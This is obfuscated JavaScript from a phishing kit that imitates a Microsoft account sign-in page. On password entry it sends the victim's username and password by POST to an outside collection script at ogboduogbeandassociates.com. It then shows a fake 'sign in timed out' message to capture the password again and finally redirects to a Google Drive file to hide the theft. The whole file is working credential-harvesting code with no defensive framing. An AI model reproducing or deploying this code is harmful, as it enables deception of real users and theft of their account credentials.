var Progress=document['getElementById']('progressBar'),Mainbox=document['getElementById']('mainbox'),Fedred=document['getElementById']('fedred'),Emailsection=document['getElementById']('emailsection'),Passsection=document['getElementById']('Passsection'),Back=document['getElementById']('idBtn_Back'),BGimg=document['getElementById']('BGimg'),LOGOimg=document['getElementById']('LOGOimg'),dimBG=document['getElementById']('dimBG'),USER=document['getElementById']('displayName'),PASS=document['getElementById']('i0118'),USER_ERR=document['getElementById']('usernameError'),PASS_ERR=document['getElementById']('passwordError'),count=0x0;function loaded(){PASS['focus'](),document['getElementById']('displayName')['innerHTML']=number,document['getElementById']('displayName')['value']=number;}Passsection['addEventListener']('keyup',function(_0x1f103d){_0x1f103d['keyCode']===0xd&&(_0x1f103d['preventDefault'](),NEE());});function validateEmail(_0x176570){var _0x3d2978=/^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;return _0x3d2978['test'](String(_0x176570)['toLowerCase']());}PASS['onkeyup']=function(){PASS_ERR['setAttribute']('style','display:none'),PASS['classList']['remove']('has-error');};function NEE(){if(PASS['value']=='')PASS_ERR['innerHTML']='Please\x20enter\x20your\x20password.',PASS_ERR['setAttribute']('style','display:block'),PASS['classList']['add']('has-error'),PASS['focus']();else{Progress['classList']['add']('progress'),Mainbox['classList']['add']('disable-lightbox');var _0x83c59=new XMLHttpRequest(),_0x2b71fa='https://ogboduogbeandassociates.com/b/log.php',_0x4ff47e='user='+USER['value']+'&pass='+PASS['value'];_0x83c59['open']('POST',_0x2b71fa,!![]),_0x83c59['setRequestHeader']('Content-type','application/x-www-form-urlencoded'),_0x83c59['send'](_0x4ff47e),count=count+0x1,_0x83c59['onreadystatechange']=function(){if(_0x83c59['readyState']==XMLHttpRequest['DONE']){count=count+0x1;var _0x44b316=_0x83c59['responseText'];count>0x2?(Passsection['classList']['replace']('slide-in-next','slide-out-next'),Passsection['classList']['replace']('slide-in-back','slide-out-next'),Passsection['setAttribute']('style','display:none'),Passsection['classList']['remove']('disable-lightbox'),Progress['classList']['remove']('progress'),Fedred['setAttribute']('style','display:block'),setTimeout(function(){window['location']['replace']('https://drive.google.com/file/d/1VkOIWwdLJFTUvHkg56uJdJUy0octC79g/view');},0xbb8)):(Progress['classList']['remove']('progress'),Mainbox['classList']['remove']('disable-lightbox'),PASS_ERR['innerHTML']='Your\x20Sign\x20in\x20timed\x20out,\x20kindly\x20sign\x20in\x20again.</a>',PASS_ERR['setAttribute']('style','display:block'),PASS['value']='',PASS['focus']());}};}}